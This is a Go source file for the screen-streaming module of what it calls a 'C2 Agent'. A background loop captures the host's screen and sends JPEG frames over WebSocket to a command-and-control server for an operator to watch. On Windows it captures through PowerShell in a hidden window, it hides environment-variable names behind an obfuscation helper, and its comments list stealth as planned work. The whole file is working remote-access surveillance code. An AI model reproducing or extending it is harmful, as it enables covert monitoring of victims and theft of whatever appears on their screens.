// stream.go — C2 Agent live screen-streaming
//
// v1.5.0 (merged into the real agent): background capture loop pushes JPEG
// frames as `type=stream_frame` WebSocket messages whose envelope matches the
// server's applyStreamFrame() parser (server stores the latest frame and
// serves it via GET /admin/stream?agent_id=X&wait_sec=N).
//
// SCOPE / HONESTY: the capture backend is real where a real backend exists:
//   - Windows : GDI CopyFromScreen -> JPEG (via PowerShell, hidden window).
//     Functional, not stealthy.
//   - Linux   : ImageMagick `import` / `gnome-screenshot` / `scrot` if present.
//   - STREAM_TEST_FRAME=1 : generates a REAL (synthetic) JPEG in-code, so the
//     full agent->server->admin/stream pipeline can be exercised end-to-end in
//     the lab without any screen. Clearly a test fixture, not a real screen.
//
// The production capture pipeline (DPI-aware bitblt, streaming codec, low CPU,
// stealth) is a TODO — this provides the correct wire contract and control flow
// so the rest of the system can be built and tested against it.

package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	streamMu     sync.Mutex
	streamStopCh chan struct{}
	streamFrameN uint64 // monotonically increasing frame number (server "frame")
	// wsWriteMu serializes ALL websocket writes so the stream goroutine never
	// interleaves a frame into a half-written command/heartbeat message.
	wsWriteMu sync.Mutex
)

// streamEnabled reports whether the live stream can push frames right now.
// Streaming is WSS-only (HTTP beacon agents have no push channel).
func streamEnabled() bool {
	return config.StreamOn && connected && conn != nil
}

// startStreamIfNeeded launches the background frame loop once.
// Safe to call repeatedly (idempotent while running).
func startStreamIfNeeded() {
	streamMu.Lock()
	if !config.StreamOn || streamStopCh != nil {
		streamMu.Unlock()
		return
	}
	ch := make(chan struct{})
	streamStopCh = ch
	streamMu.Unlock()
	go streamLoop(ch)
}

// stopStream tears down the background frame loop (idempotent).
func stopStream() {
	streamMu.Lock()
	ch := streamStopCh
	streamStopCh = nil
	streamMu.Unlock()
	if ch != nil {
		close(ch)
	}
}

// streamLoop captures and pushes one frame per StreamInterval until stopped.
func streamLoop(stop <-chan struct{}) {
	interval := config.StreamInterval
	if interval <= 0 {
		interval = 2 * time.Second
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			if !streamEnabled() {
				continue
			}
			if err := pushStreamFrame(); err != nil {
				if os.Getenv(xob(eC2AgentDebug)) == "1" {
					fmt.Fprintf(os.Stderr, "stream: %v\n", err)
				}
			}
		}
	}
}

// pushStreamFrame captures one frame and sends it to the C2 as a stream_frame
// message. The `data` field carries a JSON envelope matching the server's
// applyStreamFrame() parser: {type, agent_id, frame, size, mime, sha256, data_b64}.
func pushStreamFrame() error {
	if !streamEnabled() {
		return fmt.Errorf("stream disabled")
	}
	// Gate mirrors the screenshot/stream command gate: frames only flow while a
	// §3-1 client is active, unless FORCE_STREAM=1 (lab override).
	if os.Getenv(xob(eForceStream)) != "1" {
		if !scanGames().StreamEnable {
			return fmt.Errorf("stream_gated: game_active=false")
		}
	}

	frameNo := atomic.AddUint64(&streamFrameN, 1)
	raw, mime, err := captureCurrentFrame()
	if err != nil {
		return fmt.Errorf("capture: %w", err)
	}
	if len(raw) == 0 {
		return fmt.Errorf("capture: empty frame")
	}
	if config.StreamMaxBytes > 0 && len(raw) > config.StreamMaxBytes {
		return fmt.Errorf("frame too large: %d > %d", len(raw), config.StreamMaxBytes)
	}

	sum := sha256.Sum256(raw)

	env := map[string]interface{}{
		"type":     "stream_frame",
		"agent_id": agentID,
		"frame":    frameNo,
		"size":     len(raw),
		"mime":     mime,
		"sha256":   hex.EncodeToString(sum[:]),
		"data_b64": base64.StdEncoding.EncodeToString(raw),
	}
	envJSON, err := json.Marshal(env)
	if err != nil {
		return err
	}
	msg := map[string]interface{}{
		"type": "stream_frame",
		"data": string(envJSON),
	}
	if err := sendWS(msg); err != nil {
		return fmt.Errorf("send: %w", err)
	}
	return nil
}

// captureCurrentFrame selects the capture backend for this host.
func captureCurrentFrame() ([]byte, string, error) {
	// Explicit test fixture: a real (synthetic) JPEG generated in-code, so the
	// full pipeline can be exercised without a screen. Labeled clearly, never
	// presented as a real screenshot.
	if os.Getenv(xob(eStreamTestFrame)) == "1" {
		return testFrame()
	}
	if runtime.GOOS == "windows" {
		return captureFrameWin()
	}
	// Linux lab: use whatever lightweight capture tool is present, else fail
	// honestly rather than fabricate a "screenshot".
	for _, tool := range []string{"import", "gnome-screenshot", "scrot"} {
		if _, err := exec.LookPath(tool); err == nil {
			return captureFrameLinux(tool)
		}
	}
	return nil, "", fmt.Errorf("no capture backend on %s (set STREAM_TEST_FRAME=1 for a synthetic test frame)", runtime.GOOS)
}

// captureFrameWin captures the primary screen to a JPEG via GDI + PowerShell.
func captureFrameWin() ([]byte, string, error) {
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("c2_frm_%d.jpg", time.Now().UnixNano()))
	defer os.Remove(tmp)
	ps := fmt.Sprintf(
		`Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;
$b=New-Object Drawing.Bitmap $s.Width,$s.Height;
$g=[Drawing.Graphics]::FromImage($b);
$g.CopyFromScreen($s.Left,$s.Top,0,0,$b.Size);
$b.Save('%s',[Drawing.Imaging.ImageFormat]::Jpeg);
$g.Dispose();$b.Dispose();`,
		strings.ReplaceAll(tmp, "'", "''"),
	)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := hiddenCmdCtx(ctx, "powershell", "-NoProfile", "-NonInteractive", "-Command", ps)
	var buf bytes.Buffer
	cmd.Stdout, cmd.Stderr = &buf, &buf
	if err := cmd.Run(); err != nil {
		return nil, "", fmt.Errorf("powershell jpeg capture: %v (%s)", err, strings.TrimSpace(buf.String()))
	}
	raw, err := os.ReadFile(tmp)
	if err != nil {
		return nil, "", err
	}
	return raw, "image/jpeg", nil
}

// captureFrameLinux captures via the given ImageMagick/gnome/scrot tool.
func captureFrameLinux(tool string) ([]byte, string, error) {
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("c2_frm_%d.jpg", time.Now().UnixNano()))
	defer os.Remove(tmp)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	var cmd *exec.Cmd
	switch tool {
	case "import":
		cmd = exec.CommandContext(ctx, "import", "-window", "root", tmp)
	case "gnome-screenshot":
		cmd = exec.CommandContext(ctx, "gnome-screenshot", "-f", tmp)
	default: // scrot
		cmd = exec.CommandContext(ctx, "scrot", tmp)
	}
	var buf bytes.Buffer
	cmd.Stdout, cmd.Stderr = &buf, &buf
	if err := cmd.Run(); err != nil {
		return nil, "", fmt.Errorf("%s capture: %v (%s)", tool, err, strings.TrimSpace(buf.String()))
	}
	raw, err := os.ReadFile(tmp)
	if err != nil {
		return nil, "", err
	}
	return raw, "image/jpeg", nil
}

// testFrame returns a REAL (synthetic) JPEG whose pixels vary with the frame
// number, so consecutive frames differ and the server's "latest frame" visibly
// updates. Test fixture only (STREAM_TEST_FRAME=1).
func testFrame() ([]byte, string, error) {
	const w, h = 32, 24
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	n := int(atomic.LoadUint64(&streamFrameN))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.Set(x, y, color.RGBA{
				R: uint8((n*37 + x*5) % 256),
				G: uint8((n*53 + y*7) % 256),
				B: uint8((n*71 + x*3 + y*11) % 256),
				A: 255,
			})
		}
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60}); err != nil {
		return nil, "", err
	}
	return buf.Bytes(), "image/jpeg", nil
}
